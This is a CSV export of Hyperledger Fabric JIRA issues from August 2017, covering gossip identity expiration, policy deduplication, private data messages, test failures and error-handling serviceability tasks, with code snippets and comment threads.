Build is broken due to merge conflict,FAB-5748,20149,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,13/Aug/17 1:33 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,13/Aug/17 2:43 AM,,,,,,fabric-orderer,,,,,,0,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycxr:",,,,,,,,,,,,,,,,,,,,,,,jyellick,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
As a gossip developer I need expiration times of identities,FAB-5752,20154,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,yacovm,yacovm,yacovm,14/Aug/17 1:45 AM,21/Jul/18 3:50 AM,28/Oct/23 3:00 AM,25/Sep/17 9:49 PM,v1.0.1,,,v1.1.0,,fabric-crypto,fabric-gossip,,,,,0,active,gossip,,,,,"Gossip has an in-memory mapping from PKI-ID to peer identities.
This mapping is used to:
* Keep track of which identities are valid and which are not
* Locate the identity given a PKI-ID in order to perform verification on a message's signature, given only a PKI-ID of the message.

Since x509-based certificates (what is used currently in Fabric) - eventually expire, the procedure that the current code does to remove them once they expire is periodically (once in 24 hours) call *MessageCryptoService.Validate* on all identities.

This has the following shortcomings: 
* Once per 24 hours makes it that signatures of peers that their certificates have expired can still be incorrectly validated for a maximal duration of... 24 hours.
* Validation of certificates involves with cryptography computations that are expensive, and since certificates expire only once every few months (or years) - it is almost always a redundant check.

Therefore what I want to do, is that the MessageCryptoService would have an additional method that would tell given a *PeerIdentity* - when (*time.Time*) it expires:
* A zero value would indicate it never expires
* A non zero value would indicate that it expires at a certain time.

Then, when gossip would create a new mapping between the PKI-ID and the identity - it would spawn a timer that would fire at *NotAfter + time.Millisecond \* c* for some small constant *c*, and then the mapping would be deleted. 
* If the identity is deleted from memory before that time - the timer would be cancelled, to prevent stale timer contexts floating in the golang runtime. 

[~ellaki] [~adc] [~ales] [~C0rWin]
",,angelo.decaro,dubovitskaya,elli-androulaki,JonathanLevi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,Unset,,,,,,,,,,,,"1|hzycyv:",,,,Unset,,,,,,,,Unset,,,,,,,,,,,angelo.decaro,dubovitskaya,elli-androulaki,JonathanLevi,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"15/Aug/17 1:31 AM;elli-androulaki;Hi, [~yacovm], thanks! What you are saying looks reasonable.

Two comments:

 - One would likely need to extend the MSP interface with a function to return the expiration time for a certificate (or as result of validateIdentity(?) though not standard)

 - For the Fabric MSP (the one V1.0 supports) this is straight forward extraction of the NOT_AFTER field of the X.509 certificate, for the Idemix MSP this may be trickier in the future; however for as long as we ask Idemix certificates to carry their expiration time in the clear, i believe we are good. Adding [~dubovitskaya] and [~mdr] to the discussion.

 ;;;","15/Aug/17 3:04 AM;yacovm;{quote}One would likely need to extend the MSP interface with a function to return the expiration time for a certificate (or as result of validateIdentity though not standard){quote}

So, first of all - I don't think there is a reason to change the ValidateIdentity behavior or function signature. Knowing the expiration time isn't something useful to any component in the system (at the moment) but gossip, and changing the signature to return also the expiration time is in my opinion a too intrusive change and isn't cost-effective.
Second - I think that since Fabric only supports x509 certificates, and IdMix certificates won't have expiration in the short term ( is that correct? )- it'd make sense to not extend the MSP interface for v1.1, and instead - extend the MessageCryptoService and post v1.1 - extend the MSP and replace the code in the MessageCryptoService implementation with a call to the MSP.

What do you think?;;;","16/Aug/17 1:10 AM;dubovitskaya;Indeed, it is also possible to add the “expiration date” attribute to an Idemix credential. Then there is a choice – one can either reveal that attribute in the clear (might compromise a bit the privacy – depends how exact the date is) or prove in zero-knowledge that the value of  the “expiration date” attribute is bigger than the current date (prove the validity without revealing the attribute value in the clear). The second option is computationally more expensive though.;;;","16/Aug/17 2:30 AM;JonathanLevi;Just looking into this. The x.509 v3 dates are pretty precise/exact. Let's dive down a bit into the details/specifics:

What's the structure of the Idemix credential ([~dubovitskaya] can you post a reference to the/a doc), and ([~elli-androulaki]) what will need to change in the MSP interface to accommodate?

Thanks, J;;;","16/Aug/17 9:21 AM;angelo.decaro;[~JonathanLevi], the changes that we envision are described in FAB-5778. Just adding a reference in this JIRA item.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
De-duplicate identities in cauthdsl policy evaluation.,FAB-5753,20155,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,jyellick,jyellick,jyellick,14/Aug/17 2:49 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,31/Aug/17 4:15 PM,,,,v1.0.2,v1.1.0,fabric-orderer,,,,,,0,common-components,Release-planning-1.1,,,,,The identity deduplication was only fixed in the VSCC for v1.0.  This should have been done in the core policy code and needs to be addressed there.,,jyellick,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-4605,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzycz3:",,,,,,,,,,,2.0,,,,,,,,,,,,jyellick,yoheiueda,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,release-1.0,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Aug/17 12:27 AM;jyellick;For v1.1: https://gerrit.hyperledger.org/r/#/c/12859/
For v1.0.2: https://gerrit.hyperledger.org/r/#/c/12861/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Extend private data message with additional information required by ledger,FAB-5756,20158,18789,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,C0rWin,C0rWin,C0rWin,14/Aug/17 5:06 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,15/Aug/17 6:24 AM,,,,,,fabric-gossip,,,,,,0,active,gossip,,,,,"At the moment FAB-4976 and subsequent [commit|https://gerrit.hyperledger.org/r/#/c/12177/] added following structures into ledger APIs:

{code}
	// GetPvtDataAndBlockByNum returns the block and the corresponding pvt data.
	// The pvt data is filtered by the list of 'ns/collections' supplied
	// A nil filter does not filter any results and causes retrieving all the pvt data for the given blockNum
	GetPvtDataAndBlockByNum(blockNum uint64, filter PvtNsCollFilter) (*BlockAndPvtData, error)
	// GetPvtDataByNum returns only the pvt data  corresponding to the given block number
	// The pvt data is filtered by the list of 'ns/collections' supplied in the filter
	// A nil filter does not filter any results and causes retrieving all the pvt data for the given blockNum
	GetPvtDataByNum(blockNum uint64, filter PvtNsCollFilter) ([]*TxPvtData, error)
	// CommitWithPvtData commits the block and the corresponding pvt data in an atomic operation
	CommitWithPvtData(blockAndPvtdata *BlockAndPvtData) error
{code} 

Which operates on structures 

{code}
// TxPvtData encapsulates the transaction number and pvt write-set for a transaction
type TxPvtData struct {
	SeqInBlock uint64
	WriteSet   *rwset.TxPvtReadWriteSet
}

// BlockAndPvtData encapsultes the block and a map that contains the tuples <seqInBlock, *TxPvtData>
// The map is expected to contain the entries only for the transactions that has associated pvt data
type BlockAndPvtData struct {
	Block        *common.Block
	BlockPvtData map[uint64]*TxPvtData
}
{code}

While {{TxPvtData}} has to be replicated we need to add additional information into message, such as {{SeqInBlock}}. Hence there is a need to add new message type into protobuf to capture this information during replication, e.g.:

{code}
// PvtPayload augments private rwset data and tx index
// inside the block
message PvtDataPayload {
    uint64 tx_seq_in_block = 1;
    bytes payload = 2;
}
{code}

This message will be serialized into payload of private data field:

{code}
// Payload contains a block
message Payload {
    uint64 seq_num              = 1;
    bytes data                  = 2;
    repeated bytes private_data = 3;
}
{code}",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyczr:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"14/Aug/17 8:01 PM;C0rWin;https://gerrit.hyperledger.org/r/#/c/12413/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"PTE show instantiate successfully, but it didn't actually",FAB-5757,20160,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wsh_bob,wsh_bob,wsh_bob,14/Aug/17 5:48 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Aug/17 6:29 PM,,,,,,fabric-quality,,,,,,0,,,,,,,"1. Instantiate chaincode
info: [PTE 0 main]: [chaincodeInstantiate:Nid=0] Successfully initialize channel[mychannel]
info: [PTE 0 main]: [chaincodeInstantiate] channelName(mychannel) chaincode instantiation was good
info: [PTE 0 main]: [chaincodeInstantiate] Successfully sent chaincode instantiation Proposal and received ProposalResponse: Status - 200
info: [PTE 0 main]: [chaincodeInstantiate] Promise.all tCurr=1502239013760
info: [PTE 0 main]: [chaincodeInstantiate] Event promise all complete and testing complete
info: [PTE 0 main]: [chaincodeInstantiate(Nid=0)] Successfully instantiate transaction on mychannel.

2. constant invoke

^[[32minfo^[[39m: [PTE 0 main]: stdout: ^[[32minfo^[[39m: [PTE 0 exec]: recHist: HIST

^[[32minfo^[[39m: [PTE 0 main]: stdout: ^[[32minfo^[[39m: [PTE 0 exec]: [Nid:chan:org:id=0:mychannel:org2:0 execModeConstant] tStart 1502239099513, tLocal 1502239099578
^[[32minfo^[[39m: [PTE 0 exec]: [Nid:chan:org:id=0:mychannel:org2:0 execModeConstant] Constant Freq: 0 ms, variance Freq: 0 ms

^[[32minfo^[[39m: [PTE 0 main]: stderr: ^[[31merror^[[39m: [client-utils.js]: sendPeersProposal - Promise is rejected: Error: could not find chaincode with name 'sample_cc_ch1' - make sure the chaincode sample_cc_ch1 has been successfully instantiated and try again
 at /root/gopath/src/github.com/hyperledger/fabric-sdk-node/node_modules/grpc/src/node/src/client.js:434:17",,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-2247,,,,,,,,,"1|hzyczz:",,,,,,,,,,,,,,,,,,,,,,,wsh_bob,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add additional unit tests for ledger custom tx processor (FAB-5636),FAB-5758,20168,16240,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,manish-sethi,denyeart,denyeart,14/Aug/17 9:07 PM,30/Jul/19 10:53 AM,28/Oct/23 3:00 AM,30/Jul/19 10:53 AM,,,,,,,,,,,,0,,,,,,,Add additional unit tests for ledger custom tx processor (FAB-5636),,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd1r:",,,,,,,,,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
byfn e2e test fails on latest commit,FAB-5759,20169,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,rameshthoomu,rameshthoomu,rameshthoomu,14/Aug/17 11:11 PM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,30/Aug/17 10:52 PM,,,,,,fabric-samples,,,,,,0,fabric-samples,,,,,,"byfn e2e test fails on latest fabric-samples commit.. On the below commit there is an extra line left over and causing e2e test failures

https://github.com/hyperledger/fabric-samples/commit/419a083a2e8d62485eb66b05aad71299e7b2f1e3#diff-98c80bc3c91a7cb33f33ac5f137c1360R113",x86_64,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd1z:",,,,,,,,,,,,,,,,,,,,,,,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"30/Aug/17 10:51 PM;rameshthoomu;Working as expected after the fix.;;;","30/Aug/17 10:52 PM;rameshthoomu;https://gerrit.hyperledger.org/r/#/c/12373/;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement serviceability - CA,FAB-5762,20172,15565,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,smithbk,Clayton Sims,Clayton Sims,15/Aug/17 3:50 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,24/Aug/17 10:39 PM,,,,,,fabric-ca,,,,,,0,Release-planning-1.1,,,,,,"- Binh's email to community 

Hi, everyone FYI - on the scrum today, (#fabric-scum channel) we have decided to rework our errors handling by using the available package here

[https://github.com/pkg/errors,]

which has been vendored into the code base. Even though this package lacks of error codes, it provides the critical feature that we need -- stacktrace -- for serviceability. Using this package is 1 less thing that we have to maintain. Please follow the readme in the package to get the stacktrace for every original error in our code. If we re throw an error from our code in a different go-routine (thread), we should wrap the original error with our own error+stacktrace; otherwise, no needs to regenerate the stacktrace. Thanks, - Binh",,smithbk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FABC-65,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd2n:",,,,,,,,,,,,,,,,,,,,,,,smithbk,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"17/Aug/17 10:42 PM;smithbk;This is a duplicate of https://jira.hyperledger.org/browse/FAB-5707;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement Serviceability / Error handling - Crypto,FAB-5763,20173,15565,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,angelo.decaro,Clayton Sims,Clayton Sims,15/Aug/17 3:51 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,20/Sep/17 5:59 PM,,,,,,fabric-crypto,,,,,,0,Release-planning-1.2,,,,,,"- Binh's email to community 

Hi, everyone FYI - on the scrum today, (#fabric-scum channel) we have decided to rework our errors handling by using the available package here

[https://github.com/pkg/errors,]

which has been vendored into the code base. Even though this package lacks of error codes, it provides the critical feature that we need -- stacktrace -- for serviceability. Using this package is 1 less thing that we have to maintain. Please follow the readme in the package to get the stacktrace for every original error in our code. If we re throw an error from our code in a different go-routine (thread), we should wrap the original error with our own error+stacktrace; otherwise, no needs to regenerate the stacktrace. Thanks, - Binh",,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,57600,57600,,0%,57600,57600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd2v:",,,,,,,,,,,,,,,,,,,,,,,elli-androulaki,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"25/Aug/17 4:33 PM;elli-androulaki;Related CR: [https://gerrit.hyperledger.org/r/#/c/12771/]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement Serviceability - Gossip,FAB-5764,20174,15565,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,gennadyl,Clayton Sims,Clayton Sims,15/Aug/17 3:52 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,31/Aug/17 5:46 PM,,,,,,fabric-gossip,,,,,,0,Release-planning-1.1,,,,,,"- Binh's email to community 

Hi, everyone FYI - on the scrum today, (#fabric-scum channel) we have decided to rework our errors handling by using the available package here

[https://github.com/pkg/errors,]

which has been vendored into the code base. Even though this package lacks of error codes, it provides the critical feature that we need -- stacktrace -- for serviceability. Using this package is 1 less thing that we have to maintain. Please follow the readme in the package to get the stacktrace for every original error in our code. If we re throw an error from our code in a different go-routine (thread), we should wrap the original error with our own error+stacktrace; otherwise, no needs to regenerate the stacktrace. Thanks, - Binh",,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3582,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd33:",,,,,,,,,,,,,,,,,,,,,,,C0rWin,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Aug/17 5:33 PM;C0rWin;Duplicates FAB-3582;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LTE tool: update test tool to reflect changes in Ledger interface ,FAB-5765,20175,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,AdnanChoudhury,AdnanChoudhury,AdnanChoudhury,15/Aug/17 3:53 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,14/Sep/17 6:09 AM,,,,,,fabric-quality,,,,,,0,quality,,,,,,"The introduction of SideDB made some changes to the existing Ledger interface in the following CR: 
[https://github.com/hyperledger/fabric/commit/8a87b8ae2ca12184eb8e200c9cef5fcb9b4252b7]
The LTE needs to be updated to conform with the changes.",,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd3b:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve Ledger serviceability - Utilize error handling framework - Ledger,FAB-5766,20176,15565,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,wenjian,Clayton Sims,Clayton Sims,15/Aug/17 3:56 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,18/Jul/18 9:44 AM,,,,v1.3.0,,fabric-ledger,,,,,,0,,,,,,,"- Binh's email to community 

Hi, everyone FYI - on the scrum today, (#fabric-scum channel) we have decided to rework our errors handling by using the available package here

[https://github.com/pkg/errors,]

which has been vendored into the code base. Even though this package lacks of error codes, it provides the critical feature that we need -- stacktrace -- for serviceability. Using this package is 1 less thing that we have to maintain. Please follow the readme in the package to get the stacktrace for every original error in our code. If we re throw an error from our code in a different go-routine (thread), we should wrap the original error with our own error+stacktrace; otherwise, no needs to regenerate the stacktrace. Thanks, - Binh",,alburt,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-3578,FAB-11218,FAB-11105,,FAB-11189,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd3j:",,,,,,,,,,,,,,,,,,,,,,,alburt,wenjian,,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"29/Aug/17 9:18 PM;alburt;[~denyeart] do you still have time to solve this issue? maybe I can help:P;;;","28/Jun/18 2:32 AM;wenjian;To manage code merge conflicts and control CR size, split the changes into several independent CRs. Each CR can be merged independently.

Part 1: [https://gerrit.hyperledger.org/r/#/c/23735/]

Part 2: [https://gerrit.hyperledger.org/r/#/c/23739/]

Part 3: [https://gerrit.hyperledger.org/r/#/c/23841/]

 ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement Serviceability - Orderer,FAB-5767,20177,15565,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,,Clayton Sims,Clayton Sims,15/Aug/17 3:56 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,16/Aug/17 10:13 PM,,,,DUPLICATE,,fabric-orderer,,,,,,0,Release-planning-1.1,,,,,,"- Binh's email to community 

Hi, everyone FYI - on the scrum today, (#fabric-scum channel) we have decided to rework our errors handling by using the available package here

[https://github.com/pkg/errors,]

which has been vendored into the code base. Even though this package lacks of error codes, it provides the critical feature that we need -- stacktrace -- for serviceability. Using this package is 1 less thing that we have to maintain. Please follow the readme in the package to get the stacktrace for every original error in our code. If we re throw an error from our code in a different go-routine (thread), we should wrap the original error with our own error+stacktrace; otherwise, no needs to regenerate the stacktrace. Thanks, - Binh",,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-5731,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd3r:",,,,,,,,,,,,,,,,,,,,,,,kchristidis,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Aug/17 10:12 PM;kchristidis;We are already tracking this via FAB-5731 (which is tagged appropriately and show be visible in the 1.1 release planning dashboard). Closing as duplicate.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement Serviceability - SDK Java,FAB-5768,20178,15565,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Done,,Clayton Sims,Clayton Sims,15/Aug/17 3:59 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,19/Oct/17 11:19 PM,,,,WON'T FIX,,fabric-sdk-java,,,,,,0,,,,,,,"- Binh's email to community 

Hi, everyone FYI - on the scrum today, (#fabric-scum channel) we have decided to rework our errors handling by using the available package here

[https://github.com/pkg/errors,]

which has been vendored into the code base. Even though this package lacks of error codes, it provides the critical feature that we need -- stacktrace -- for serviceability. Using this package is 1 less thing that we have to maintain. Please follow the readme in the package to get the stacktrace for every original error in our code. If we re throw an error from our code in a different go-routine (thread), we should wrap the original error with our own error+stacktrace; otherwise, no needs to regenerate the stacktrace. Thanks, - Binh",,denyeart,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd3z:",,,,,,,,,,,,,,,,,,,,,,,denyeart,rickr,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Sep/17 6:19 AM;Clayton Sims;Anything left to do here?   What is eta?;;;","18/Oct/17 2:41 AM;rickr;[~denyeart] assigning to Dave since was not discussed version and he's putting it as 1.1;;;","18/Oct/17 5:28 AM;denyeart;[~rickr] The dashboards report off of label 'release-planning-1.1'.  This one was already in the release-planning-1.1 list, I was just catching up the Version field.  It does not mean there is a commitment.  Serviceability improvement is best-effort depending on other priorities.;;;","19/Oct/17 11:19 PM;rickr;This JIRA's description is GO technology specific. Java SDK provides stacktraces and always has and logs them. I don't see a ny specific to dos for Java SDK with this.  As we spot issues where serviceability can be improved we'll open JIRA with details on those specific improvements.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement Serviceability - SDK Node,FAB-5769,20179,15565,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Highest,Won't Do,,Clayton Sims,Clayton Sims,15/Aug/17 4:00 AM,12/Jan/19 1:01 AM,28/Oct/23 3:00 AM,12/Jan/19 1:01 AM,,,,,,fabric-sdk-node,,,,,,0,,,,,,,"- Binh's email to community 

Hi, everyone FYI - on the scrum today, (#fabric-scum channel) we have decided to rework our errors handling by using the available package here

[https://github.com/pkg/errors,]

which has been vendored into the code base. Even though this package lacks of error codes, it provides the critical feature that we need -- stacktrace -- for serviceability. Using this package is 1 less thing that we have to maintain. Please follow the readme in the package to get the stacktrace for every original error in our code. If we re throw an error from our code in a different go-routine (thread), we should wrap the original error with our own error+stacktrace; otherwise, no needs to regenerate the stacktrace. Thanks, - Binh",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd47:",,,,,,,,,,,,,,,,,,,,,,,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Sep/17 6:20 AM;Clayton Sims;Anything left to do here?;;;","12/Jan/19 1:01 AM;denyeart;Will create new Jira items for any remaining work.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Ledger LTE tests are failing on latest commits,FAB-5770,20180,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,AdnanChoudhury,rameshthoomu,rameshthoomu,15/Aug/17 4:01 AM,20/Jul/18 11:14 PM,28/Oct/23 3:00 AM,24/Aug/17 10:50 PM,v1.0.1,,,,,fabric-ledger,,,,,,0,Ledger,,,,,,"Observed ledger LTE tests are failing on latest fabric commits. Daily tests are failing since 3 days with these failures.

*Fabric Commit# 762fdfb*

*Build# https://jenkins.hyperledger.org/view/Daily/job/fabric-daily-tests-x86_64/52/consoleFull*",,AdnanChoudhury,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"1|hzyd4f:",,,,,,,,,,,,,,,,,,,,,,,AdnanChoudhury,denyeart,rameshthoomu,,,,,,,,,,,,,,,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"16/Aug/17 5:35 AM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/12499/;;;","24/Aug/17 10:51 PM;denyeart;[~AdnanChoudhury] This one was merged, I'm marking as Done but please confirm it works now.;;;","26/Aug/17 3:32 AM;AdnanChoudhury;https://gerrit.hyperledger.org/r/#/c/12499/;;;","26/Aug/17 3:35 AM;AdnanChoudhury;[~denyeart] Latest tests are working (logs can be viewed here https://jenkins.hyperledger.org/view/Daily/job/fabric-daily-tests-x86_64/);;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
